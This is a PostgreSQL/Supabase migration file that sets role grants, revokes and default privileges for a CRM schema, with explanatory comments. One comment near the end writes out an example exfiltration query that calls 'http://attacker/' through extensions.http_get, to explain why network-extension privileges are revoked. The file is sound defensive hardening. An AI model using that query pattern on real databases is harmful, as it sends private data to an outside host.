--
-- Grants
-- RLS is the row-level boundary. These grants provide only the verbs needed by
-- the browser application; anon receives no access to commercial data.
--

grant usage on schema public to postgres, authenticated, service_role;
revoke usage on schema public from anon;

revoke all on all tables in schema public from anon, authenticated;
revoke all on all sequences in schema public from anon, authenticated;
revoke all on all functions in schema public from public, anon, authenticated;

-- Browser data access. Policies in 05_policies.sql further constrain every row.
grant select, insert, update, delete on table public.companies to authenticated;
grant select, insert, update, delete on table public.contacts to authenticated;
grant select, insert, update, delete on table public.contact_notes to authenticated;
grant select, insert, update, delete on table public.deals to authenticated;
grant select, insert, update, delete on table public.deal_notes to authenticated;
grant select on table public.sales to authenticated;
grant select, insert, update, delete on table public.tags to authenticated;
grant select, insert, update, delete on table public.tasks to authenticated;
grant select, update on table public.configuration to authenticated;
grant select on table public.favicons_excluded_domains to authenticated;
grant select, update on table public.lead_profiles to authenticated;
grant select, insert, update, delete on table public.acquisition_attributions to authenticated;
grant select, insert, update, delete on table public.loss_reasons to authenticated;

-- Inbound email ledger: read-only, and the policy in 05_policies.sql narrows
-- that to owners. No INSERT/UPDATE/DELETE for the browser — the Postmark Edge
-- Function is the only writer and it runs as service_role, which the blanket
-- `grant all ... to service_role` below already covers.
grant select on table public.inbound_emails to authenticated;

-- Views are read-only API resources. security_invoker views apply the caller's
-- RLS policies on their source tables.
grant select on table public.activity_log to authenticated;
grant select on table public.companies_summary to authenticated;
grant select on table public.contacts_summary to authenticated;

-- Identity sequences require USAGE for inserts performed through PostgREST.
grant usage on sequence public.companies_id_seq to authenticated;
grant usage on sequence public."contactNotes_id_seq" to authenticated;
grant usage on sequence public.contacts_id_seq to authenticated;
grant usage on sequence public."dealNotes_id_seq" to authenticated;
grant usage on sequence public.deals_id_seq to authenticated;
grant usage on sequence public.tags_id_seq to authenticated;
grant usage on sequence public.tasks_id_seq to authenticated;
grant usage on sequence public.acquisition_attributions_id_seq to authenticated;
grant usage on sequence public.loss_reasons_id_seq to authenticated;

-- Policy helper functions are executable by authenticated callers only. The
-- remaining functions are trigger/internal or service-role-only operations.
grant execute on function public.current_sales_id() to authenticated;
grant execute on function public.is_active_sales_user() to authenticated;
grant execute on function public.is_admin() to authenticated;
grant execute on function public.can_manage_sales_id(bigint) to authenticated;
grant execute on function public.can_access_contact(bigint) to authenticated;
grant execute on function public.can_access_deal(bigint) to authenticated;
grant execute on function public.get_user_id_by_email(text) to service_role;

grant all on all tables in schema public to service_role;
grant all on all sequences in schema public to service_role;
grant all on all functions in schema public to service_role;

-- Owner bootstrap: an act of a person holding the database credential, never
-- of an application role, the service role included. These revokes must come
-- AFTER the blanket service_role grants above, which would otherwise include
-- them. Matches 20260917180200_owner_bootstrap.sql.
revoke all on table public.owner_provisioning_log from anon, authenticated, service_role;
revoke all on sequence public.owner_provisioning_log_id_seq from anon, authenticated, service_role;
revoke all on function public.bootstrap_owner(uuid, text, text) from public, anon, authenticated, service_role;

-- Deal stage-transition ledger (Phase 3B.1): written only by its trigger,
-- read only by the ops commercial adapter. Same position as above: after the
-- blanket service_role grants. Matches
-- 20260929120000_deal_stage_transition_ledger.sql.
revoke all on table public.deal_stage_transitions from anon, authenticated, service_role;
revoke all on sequence public.deal_stage_transitions_id_seq from anon, authenticated, service_role;
revoke all on function public.record_deal_stage_transition() from public, anon, authenticated, service_role;
revoke all on function public.deal_stage_transitions_append_only() from public, anon, authenticated, service_role;

-- New objects are private by default. Add explicit grants above when a browser
-- capability is intentionally introduced.
alter default privileges for role postgres in schema public revoke all on tables from anon, authenticated;
alter default privileges for role postgres in schema public revoke all on sequences from anon, authenticated;
alter default privileges for role postgres in schema public revoke execute on functions from public, anon, authenticated;
alter default privileges for role postgres in schema public grant all on tables to service_role;
alter default privileges for role postgres in schema public grant all on sequences to service_role;
alter default privileges for role postgres in schema public grant all on functions to service_role;

--
-- Network-capable extensions
--
-- The hardening above is scoped `in schema public`, so it never touched
-- `extensions` or `net` — where the outbound-HTTP functions live. A plain
-- `SELECT extensions.http_get('http://attacker/?d=' || (SELECT ...))` is a
-- syntactically read-only statement that satisfies RLS and still posts the
-- rows off-box. The boundary is EXECUTE, not the SQL parser.
--
-- ⚠️ The enforcement is the hand-written migration
-- `20260911130000_revoke_network_extension_privileges.sql`, NOT this file.
-- The revoke has to iterate `pg_depend` to cover every member of the `http`,
-- `pg_net` and `dblink` extensions (the member list changes with the extension
-- version, so a static list fails open), and `supabase db diff` does not emit
-- DO blocks. This comment records the intent; change both together.
--
-- USAGE on `extensions` is deliberately KEPT: `companies.website` and
-- `sales.email` are `extensions.citext`, and filtering them resolves the
-- `citext = citext` operator by name, which requires schema USAGE.
